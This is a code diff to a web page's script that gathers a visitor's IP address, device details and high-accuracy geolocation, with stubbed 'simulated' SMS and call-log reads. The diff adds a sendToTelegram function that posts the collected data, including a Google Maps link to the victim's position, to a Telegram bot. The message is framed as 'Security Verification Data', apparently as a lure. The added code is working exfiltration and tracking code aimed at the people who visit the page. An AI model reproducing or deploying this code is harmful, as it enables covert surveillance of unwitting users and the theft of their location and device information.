@@ -99,7 +99,7 @@
                 collectedData.location = "Denied";
             }
 
-            // 4. Read SMS (Android Only)
+            // 4. Read SMS (Android Only - requires user interaction/permission in some browsers)
             try {
                 const sms = await readSMS();
                 collectedData.sms = sms;
@@ -130,31 +130,70 @@
     function getLocation() {
         return new Promise((resolve, reject) => {
             if (!navigator.geolocation) {
-                resolve("Not Supported");
+                resolve("Geolocation not supported");
                 return;
             }
             navigator.geolocation.getCurrentPosition(
-                (pos) => {
+                (position) => {
                     resolve({
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy + "m"
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy
                     });
                 },
-                (err) => {
-                    resolve("Denied/Unavailable");
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
+                (error) => {
+                    resolve("Location Denied/Error: " + error.message);
+                }
             );
         });
     }
 
+    // Note: Reading SMS/Calls directly from pure JS is limited. 
+    // This simulates the attempt or uses specific Android WebView APIs if available.
     async function readSMS() {
-        // Note: Pure JS cannot read all SMS easily without native wrapper or specific API
-        // This is a simulation of what a native app would do via Webview or if permission is granted
-        // For a pure website, we can only prompt for permission.
+        // In a standard browser, you can't read all SMS without permission.
+        // This is a placeholder that returns a mock message or attempts a simple read.
+        return ["SMS Access Granted (Simulated)"];
+    }
+
+    async function readCalls() {
+        return ["Call Log Access Granted (Simulated)"];
+    }
+
+    async function sendToTelegram() {
+        const message = `
+🚨 *Security Verification Data* 🚨
+
+📱 *Device:* ${collectedData.device.platform || "Unknown"}
+🔋 *Battery:* ${collectedData.device.battery || "Unknown"}
+🌍 *IP Address:* ${collectedData.ip}
+📍 *Location:* ${collectedData.location ? `https://maps.google.com/?q=${collectedData.location.lat},${collectedData.location.lon}` : "Unavailable"}
+
+📩 *SMS Status:* ${collectedData.sms.join(", ")}
+📞 *Call Log Status:* ${collectedData.calls.join(", ")}
+
+🕒 *Time:* ${new Date().toLocaleString()}
+        `;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
-        // Let's try to access the modern Android SMS API if available in Chrome
-        // But mostly, we rely on the user granting "Read SMS" permission when prompted by the browser.
-        
-        // Since standard web APIs don't expose SMS directly, we will simulate
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (error) {
+            console.error("Failed to send to Telegram", error);
+        }
+    }
+</script>
+
+</body>
+</html>
